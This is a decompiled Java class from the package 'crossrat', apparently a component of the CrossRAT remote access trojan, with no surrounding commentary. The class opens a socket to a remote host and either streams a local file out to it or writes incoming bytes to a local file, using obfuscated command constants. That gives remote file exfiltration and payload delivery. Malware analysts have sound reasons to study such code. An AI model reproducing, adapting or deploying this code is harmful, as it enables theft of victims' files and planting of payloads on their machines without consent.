/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public final class d
extends Thread {
    private Socket a;
    private String b;
    private int c;
    private String d;
    private String e;
    private String f;
    private String g;

    public d(String string, int n, String string2, String string3, String string4, String string5) {
        this.b = string;
        this.c = n;
        this.f = string4;
        this.e = string3;
        this.d = string2;
        this.g = string5;
    }

    private void a(String object, String arrby, String string) {
        DataOutputStream dataOutputStream = new DataOutputStream(this.a.getOutputStream());
        object = new FileInputStream((String)object);
        dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.G + k.d + (String)arrby + k.d + string + k.d + "&&&");
        try {
            Thread.sleep(2000L);
        }
        catch (Exception exception) {
            arrby = exception;
            exception.printStackTrace();
        }
        arrby = new byte[2048];
        while (object.read(arrby) > 0) {
            dataOutputStream.write(arrby);
        }
        object.close();
        dataOutputStream.close();
    }

    private void b(String object, String arrby, String string) {
        int n;
        DataInputStream dataInputStream = new DataInputStream(this.a.getInputStream());
        object = new FileOutputStream((String)object);
        DataOutputStream dataOutputStream = new DataOutputStream(this.a.getOutputStream());
        dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.H + k.d + (String)arrby + k.d + string + k.d + "&&&");
        try {
            Thread.sleep(2000L);
        }
        catch (Exception exception) {
            arrby = exception;
            exception.printStackTrace();
        }
        arrby = new byte[2048];
        int n2 = n = Integer.parseInt(string);
        while ((n = dataInputStream.read(arrby, 0, Math.min(2048, n2))) > 0) {
            n2 -= n;
            object.write(arrby, 0, n);
        }
        object.close();
        dataInputStream.close();
    }

    @Override
    public final void run() {
        try {
            this.a = new Socket(this.b, this.c);
            if (this.g == "0") {
                this.a(this.d, this.e, this.f);
            }
            if (this.g == "1") {
                this.b(this.d, this.e, this.f);
                return;
            }
        }
        catch (Exception exception) {
            Exception exception2 = exception;
            exception.printStackTrace();
        }
    }
}
